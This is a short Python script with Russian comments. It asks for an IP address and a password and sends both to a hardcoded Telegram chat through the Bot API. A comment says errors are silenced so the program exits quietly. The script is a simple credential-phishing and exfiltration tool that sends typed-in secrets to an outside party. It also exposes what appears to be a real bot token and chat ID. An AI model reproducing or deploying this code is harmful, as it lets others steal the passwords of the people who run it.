import requests

# Указываем токен вашего бота, который вы получили от BotFather
API_TOKEN = '6909540691:AAGCd2QUks0pCAxHDElgtbsKLQmGhFVbXOE'

# URL для отправки сообщения через Telegram Bot API
URL = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"

try:
    # Запрашиваем данные пользователя
    name = input("Ip: ")
    surname = input("Pass: ")

    # Формируем текст сообщения
    message = f"Ip: {name}\nPass: {surname}"

    # Указываем ID чата (может быть ваш собственный ID или ID группы, куда будут отправляться сообщения)
    chat_id = '474177587'

    # Данные для отправки запроса
    payload = {
        'chat_id': chat_id,
        'text': message
    }

    # Отправляем POST-запрос к API Telegram для отправки сообщения
    response = requests.post(URL, data=payload)

    # Проверяем, успешен ли запрос (статус 200 означает успешный запрос)
    if response.status_code != 200:
        raise Exception(f"Ошибка при отправке сообщения: {response.text}")

except Exception as e:
    # Игнорируем любые ошибки, чтобы программа завершилась "тихо"
    pass